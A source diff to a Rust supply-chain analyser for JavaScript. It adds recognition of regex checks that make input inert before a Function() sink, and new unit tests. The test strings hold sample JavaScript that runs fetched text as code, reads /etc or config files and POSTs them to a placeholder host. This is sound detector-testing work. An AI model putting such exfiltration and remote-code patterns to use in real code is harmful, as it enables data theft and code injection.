@@ -494,6 +494,143 @@ pub fn received_cat(cat: u8) -> Option<&'static str> {
     }
 }
 
+/// D-20: is a text that passes this regular expression's test (its source and flags) no code? The test runs from `^`
+/// to `$`, and what it lets through builds no string (no quote, backquote or backslash), reaches no property (no `.`,
+/// no brackets) and opens no block (no braces), and what it repeats, or a class, has at most one letter (`$` is one;
+/// `_` and digits go with it): JupyterLab's gettext checks a translation's plural forms with
+/// `^\s*nplurals\s*=\s*\d+\s*;\s*plural\s*=[\s\-?|&=!<>+*/%:;n0-9_()]+$` before it makes them a function, and
+/// what passes is arithmetic on `n` (the fixed words are the pattern's, which is in the file). Anything else is not
+/// read (false): a group, an alternation, `.`, a negated class, `\w`, `\b`, an escape by number, and the flags `i`,
+/// `m` and `v`.
+pub fn inert_pattern(src: &[u32], flags: &[u32]) -> bool {
+    if flags.iter().any(|&f| !matches!(char::from_u32(f), Some('d' | 'g' | 's' | 'u' | 'y'))) {
+        return false;
+    }
+    let n = src.len();
+    if n < 2 || src[0] != 0x5E || src[n - 1] != 0x24 {
+        return false;
+    }
+    let body = &src[1..n - 1];
+    let mut letters: Vec<u32> = Vec::new();
+    let mut i = 0;
+    while i < body.len() {
+        let Some((chars, class, next)) = pattern_atom(body, i) else {
+            return false;
+        };
+        let Some((repeats, next)) = pattern_count(body, next) else {
+            return false;
+        };
+        i = next;
+        for c in chars {
+            if !inert_char(c) {
+                return false;
+            }
+            let letter = matches!(char::from_u32(c), Some('A'..='Z' | 'a'..='z' | '$'));
+            if letter && (class || repeats) && !letters.contains(&c) {
+                letters.push(c);
+            }
+        }
+    }
+    letters.len() <= 1
+}
+
+/// One atom of a pattern at `i`: the characters it may match (whitespace as a space), whether it is a class, and
+/// where it ends; None for what inert_pattern does not read.
+fn pattern_atom(body: &[u32], i: usize) -> Option<(Vec<u32>, bool, usize)> {
+    let c = char::from_u32(body[i])?;
+    match c {
+        '\\' => {
+            let (chars, next) = pattern_escape(body, i + 1)?;
+            let class = chars.len() > 1;
+            Some((chars, class, next))
+        }
+        '[' => {
+            let mut j = i + 1;
+            if body.get(j) == Some(&0x5E) {
+                return None;
+            }
+            let mut chars = Vec::new();
+            loop {
+                let c = *body.get(j)?;
+                if c == 0x5D {
+                    return Some((chars, true, j + 1));
+                }
+                let (lo, next) = if c == 0x5C { pattern_escape(body, j + 1)? } else { (vec![c], j + 1) };
+                // a range `a-z` (not one of a class escape: `[\d-z]` is three things to JavaScript)
+                if body.get(next) == Some(&0x2D) && body.get(next + 1).is_some_and(|&d| d != 0x5D) {
+                    let (hi, after) = if body[next + 1] == 0x5C { pattern_escape(body, next + 2)? } else { (vec![body[next + 1]], next + 2) };
+                    let (&[lo], &[hi]) = (lo.as_slice(), hi.as_slice()) else {
+                        return None;
+                    };
+                    if lo > hi || hi - lo > 0x80 {
+                        return None;
+                    }
+                    chars.extend(lo..=hi);
+                    j = after;
+                } else {
+                    chars.extend(lo);
+                    j = next;
+                }
+            }
+        }
+        '(' | ')' | '|' | '.' | '*' | '+' | '?' | '{' | '}' | ']' | '^' | '$' => None,
+        _ => Some((vec![body[i]], false, i + 1)),
+    }
+}
+
+/// The characters an escape at `j` (after its backslash) matches, and where it ends: `\s` and `\d`, the whitespace
+/// escapes, an escaped punctuation character; None for the rest (`\w`, `\b`, `\1`, `\u…`, `\p{…}`, …).
+fn pattern_escape(body: &[u32], j: usize) -> Option<(Vec<u32>, usize)> {
+    let c = char::from_u32(*body.get(j)?)?;
+    let chars = match c {
+        's' | 'n' | 't' | 'r' | 'f' | 'v' => vec![0x20],
+        'd' => (0x30..=0x39).collect(),
+        c if c.is_ascii_punctuation() => vec![c as u32],
+        _ => return None,
+    };
+    Some((chars, j + 1))
+}
+
+/// A quantifier at `i`: whether it lets the atom repeat, and where it ends (none: no repeat).
+fn pattern_count(body: &[u32], i: usize) -> Option<(bool, usize)> {
+    let (repeats, mut next) = match body.get(i).and_then(|&c| char::from_u32(c)) {
+        Some('*' | '+') => (true, i + 1),
+        Some('?') => (false, i + 1),
+        Some('{') => {
+            let close = i + body[i..].iter().position(|&c| c == 0x7D)?;
+            let inner: String = body[i + 1..close].iter().filter_map(|&c| char::from_u32(c)).collect();
+            let (lo, hi) = match inner.split_once(',') {
+                None => (inner.as_str(), Some(inner.as_str())),
+                Some((lo, "")) => (lo, None),
+                Some((lo, hi)) => (lo, Some(hi)),
+            };
+            lo.parse::<u32>().ok()?;
+            let most = match hi {
+                Some(h) => h.parse::<u32>().ok()?,
+                None => u32::MAX,
+            };
+            (most > 1, close + 1)
+        }
+        _ => return Some((false, i)),
+    };
+    // (lazy: the same characters)
+    if body.get(next) == Some(&0x3F) {
+        next += 1;
+    }
+    Some((repeats, next))
+}
+
+/// A character inert_pattern lets through: whitespace, or printable ASCII but a quote, a backslash, `.`, a bracket
+/// or a brace.
+fn inert_char(c: u32) -> bool {
+    match char::from_u32(c) {
+        Some('\t' | '\n' | '\x0B' | '\x0C' | '\r' | ' ') => true,
+        Some('\'' | '"' | '`' | '\\' | '.' | '[' | ']' | '{' | '}') => false,
+        Some(c) => c.is_ascii_graphic(),
+        None => false,
+    }
+}
+
 // ---------------------------------------------------------------- the model --
 
 /// The supply-chain model of one text: the pack, the text (its spans are
@@ -1424,6 +1561,10 @@ impl<'p> Eval<'p> {
         if !v.tainted() {
             return;
         }
+        // (a text that passed a test no code passes: clean for CODE, D-20's sc_checked)
+        if cat == RUN_CODE && v.clean & bit(CODE) != 0 {
+            return;
+        }
         let label = Rc::new(self.p.fns[self.fid as usize].label());
         let entry: Entry = (self.m, at, label, false);
         for &key in v.params.iter() {
@@ -1439,6 +1580,96 @@ impl<'p> Eval<'p> {
             if let Some(from) = v.sc.as_ref().and_then(|s| decoded_at(s)) {
                 self.findings.push(Out::Decoded { at, from });
             }
+        }
+    }
+
+    /// After `if (!/^…$/.test(x)) throw …;` (or `return`), x passed a test that no code passes (inert_pattern): what
+    /// it holds is clean for CODE from there, and a received-code sink given it runs nothing it was given (D-20:
+    /// JupyterLab's gettext makes the plural forms its server sends a function, `Function('n', … + forms + …)`,
+    /// once they pass `^\s*nplurals\s*=\s*\d+\s*;\s*plural\s*=[\s\-?|&=!<>+*/%:;n0-9_()]+$`).
+    pub(super) fn sc_checked(&mut self, st: NodeId, scope: ScopeId) {
+        let Some((callee, name)) = self.sc_failed_test(st) else {
+            return;
+        };
+        // (a direct eval() or a with statement makes `RegExp` another name only for the code within its own function:
+        // around the test, it is not the global; elsewhere in the file it changes the global as any code can, and a
+        // literal's `test` as much, which the reading takes as the runtime's, as regexp_receiver does)
+        let around = self.p.scope_fns(self.fid);
+        let eval_with = around.iter().any(|&f| self.p.fns[f as usize].eval_with);
+        if !self.regexp_receiver_with(callee, scope, eval_with) {
+            return;
+        }
+        let obj = self.a().unwrap(self.a().at(callee, jt::A));
+        let Some((src, flags)) = self.sc_regexp_source(obj, scope, 0) else {
+            return;
+        };
+        if !inert_pattern(&src, &flags) {
+            return;
+        }
+        let Some(b) = self.bind(name, scope) else {
+            return;
+        };
+        let v = self.read(b);
+        if v.tainted() {
+            self.write(b, v.sanitize(bit(CODE)), true);
+        }
+    }
+
+    /// `if (!re.test(name)) throw …` (or `return`, or a block that ends so), no `else`: the test's callee and the
+    /// name.
+    fn sc_failed_test(&self, st: NodeId) -> Option<(NodeId, NodeId)> {
+        let a = self.a();
+        if a.opt(st, jt::C).is_some() {
+            return None;
+        }
+        let mut cons = a.at(st, jt::B);
+        if a.kind(cons) == Kind::BlockStatement {
+            cons = *a.list(cons, jt::A).iter().rev().find(|&&s| s != NONE)?;
+        }
+        if !matches!(a.kind(cons), Kind::ThrowStatement | Kind::ReturnStatement) {
+            return None;
+        }
+        let test = a.unwrap(a.at(st, jt::A));
+        if a.kind(test) != Kind::UnaryExpression || a.operator(test) != "!" {
+            return None;
+        }
+        let call = a.unwrap(a.at(test, jt::A));
+        if a.kind(call) != Kind::CallExpression {
+            return None;
+        }
+        let callee = a.at(call, jt::A);
+        if a.kind(callee) != Kind::MemberExpression || !a.prop_name(callee).is_some_and(|n| eq(&n, "test")) {
+            return None;
+        }
+        match a.list(call, jt::B) {
+            [arg] if a.kind(*arg) == Kind::Identifier => Some((callee, *arg)),
+            _ => None,
+        }
+    }
+
+    /// A regular expression's source and flags: a literal's, a `RegExp(…)`'s given constants, or those of a name
+    /// given one once.
+    fn sc_regexp_source(&self, node: NodeId, scope: ScopeId, depth: u32) -> Option<(PyStr, PyStr)> {
+        let a = self.a();
+        match a.kind(node) {
+            Kind::Literal if a.op(node) == jt::L_REGEX => Some((a.s(node, jt::A).to_vec(), a.s(node, jt::B).to_vec())),
+            Kind::NewExpression | Kind::CallExpression => match a.list(node, jt::B) {
+                [src] => Some((self.sc_const_str(*src)?, Vec::new())),
+                [src, flags] => Some((self.sc_const_str(*src)?, self.sc_const_str(*flags)?)),
+                _ => None,
+            },
+            Kind::Identifier if depth == 0 => {
+                let b = self.bind(node, scope)?;
+                let bind = &self.p.binds[b as usize];
+                match bind.writes.as_slice() {
+                    [Write::Init { node: init, scope: sc, path }] if path.is_empty() => {
+                        let (init, sc) = (*init, *sc);
+                        self.sc_regexp_source(init, sc, depth + 1)
+                    }
+                    _ => None,
+                }
+            }
+            _ => None,
         }
     }
 
@@ -4011,6 +4242,95 @@ mod tests {
         // a callback given a constant, or one that sends nothing
         assert_eq!(sent(&format!("function f(cb) {{ cb('x'); }}\nf((d) => {});\n", post("d"))), None);
         assert_eq!(sent("function f(cb) { cb(JSON.stringify(process.env)); }\nf((d) => console.log(d.length));\n"), None);
+    }
+
+    #[test]
+    fn what_inert_pattern_reads() {
+        let p = |s: &str, f: &str| inert_pattern(&u(s), &u(f));
+        // (D-20) JupyterLab's gettext's test of a translation's plural forms; digits; one letter, repeated
+        assert!(p(r"^\s*nplurals\s*=\s*\d+\s*;\s*plural\s*=[\s\-?|&=!<>+*/%:;n0-9_()]+$", ""));
+        assert!(p(r"^\d{1,3}$", "g"));
+        assert!(p(r"^[0-9a]+$", ""));
+        assert!(p(r"^return n$", ""));
+        // two letters; every letter; a range over every printable character
+        assert!(!p(r"^[0-9ab]+$", ""));
+        assert!(!p(r"^n+x+$", ""));
+        assert!(!p(r"^[a-z]+$", ""));
+        assert!(!p(r"^[!-~]+$", ""));
+        // not to the end (gettext.js's test), not from the start, an escaped `$`
+        assert!(!p(r"^\s*nplurals\s*=\s*\d+\s*;\s*plural\s*=\s*(?:\s|[-\?\|&=!<>+*/%:;n0-9_\(\)])+", ""));
+        assert!(!p(r"\d+$", ""));
+        assert!(!p(r"^\d+\$", ""));
+        // a group, an alternation, any character, a negated class, `\w`, an escape by number
+        assert!(!p(r"^(?:\d)+$", ""));
+        assert!(!p(r"^\d+|.*$", ""));
+        assert!(!p(r"^.+$", ""));
+        assert!(!p(r"^[^']+$", ""));
+        assert!(!p(r"^\w+$", ""));
+        assert!(!p(&format!("^[{}x61{}u0061]+$", '\\', '\\'), ""));
+        // a quote, a bracket, a dot, a brace
+        assert!(!p(r#"^[\d'"]+$"#, ""));
+        assert!(!p(r"^[\d\[\]]+$", ""));
+        assert!(!p(r"^[\d\.]+$", ""));
+        assert!(!p(r"^[\d{}]+$", ""));
+        // the flags: `m` (`$` before a line's end), `i` (each letter twice), `v`
+        assert!(!p(r"^\d+$", "m"));
+        assert!(!p(r"^n+$", "i"));
+        assert!(!p(r"^\d+$", "v"));
+    }
+
+    #[test]
+    fn a_text_that_passed_a_test_no_code_passes_runs_nothing_it_received() {
+        // D-20: JupyterLab's gettext makes the plural forms its server sends a function once they pass its test
+        let gettext = |test: &str| {
+            format!(
+                "function pluralFunc(e) {{ if (!{}.test(e)) throw Error('bad forms'); \
+                 return Function('n', 'let plural, nplurals; ' + e + ' return plural;'); }}\n\
+                 fetch('https://{}/t').then((r) => r.json()).then((d) => pluralFunc(d.forms));\n",
+                test, HOST
+            )
+        };
+        let jupyter = r#"RegExp("^\\s*nplurals\\s*=\\s*\\d+\\s*;\\s*plural\\s*=[\\s\\-?|&=!<>+*/%:;n0-9_()]+$")"#;
+        assert_eq!(runs(&gettext(jupyter)), None);
+        assert_eq!(runs(&gettext(r"/^\s*nplurals\s*=\s*\d+\s*;\s*plural\s*=[\s\-?|&=!<>+*/%:;n0-9_()]+$/")), None);
+        // the test in a name, a block that ends in `throw`, the received text itself
+        let named = format!("const FORMS = /^[\\d n+*%()<>=!?:;-]+$/;\n{}", gettext("FORMS"));
+        assert_eq!(runs(&named), None);
+        let block = format!(
+            "fetch('https://{}/t').then((r) => r.text()).then((t) => {{ if (!/^[\\d+*\\/() -]+$/.test(t)) {{ \
+             console.log('no'); throw 0; }} return Function('return ' + t)(); }});\n",
+            HOST
+        );
+        assert_eq!(runs(&block), None);
+        // a test that lets code through: not to the end (gettext.js's), letters, any character
+        assert_eq!(runs(&gettext(r"/^\s*nplurals\s*=\s*\d+\s*;\s*plural\s*=\s*(?:\s|[-\?\|&=!<>+*/%:;n0-9_\(\)])+/")), Some("run"));
+        assert_eq!(runs(&gettext(r"/^[a-z()]+$/")), Some("run"));
+        assert_eq!(runs(&gettext(r"/^.+$/")), Some("run"));
+        // a test whose failure goes on, a test of another name, a test with an `else`, no test
+        let on = gettext(r"/^\d+$/").replace("throw Error('bad forms');", "console.log('bad forms');");
+        assert_eq!(runs(&on), Some("run"));
+        let other = gettext(r"/^\d+$/").replace(".test(e)", ".test(n)").replace("pluralFunc(e)", "pluralFunc(e, n)");
+        assert_eq!(runs(&other), Some("run"));
+        let with_else = gettext(r"/^\d+$/").replace("throw Error('bad forms');", "throw Error('bad forms'); else e = e;");
+        assert_eq!(runs(&with_else), Some("run"));
+        let none = gettext(r"/^\d+$/").replace("if (!/^\\d+$/.test(e)) throw Error('bad forms');", "");
+        assert_eq!(runs(&none), Some("run"));
+        // a RegExp the file replaced
+        let rebound = format!("RegExp = function () {{ return {{ test: () => true }}; }};\n{}", gettext(jupyter));
+        assert_eq!(runs(&rebound), Some("run"));
+    }
+
+    #[test]
+    fn a_system_folder_is_the_folder_not_a_name_that_begins_with_it() {
+        // D-20: `/app\b` read the route `/app-config` (inspect-ai's view, a fetch's) as the folder `/app`, and the
+        // response then as a file read under it
+        let post = format!("fetch('https://{}/c', {{ method: 'POST', body: v }});\n", HOST);
+        let load = |path: &str| format!("function load(p) {{ return require('fs').readFileSync(p, 'utf8'); }}\nconst v = load('{}');\n{}", path, post);
+        assert_eq!(sent(&load("/app/config.json")), found("file", "/app/config.json"));
+        assert_eq!(sent(&load("/etc")), found("file", "/etc"));
+        assert_eq!(sent(&load("/app-config")), None);
+        assert_eq!(sent(&load("/data.json")), None);
+        assert_eq!(sent(&load("/home-page")), None);
     }
 
     #[test]
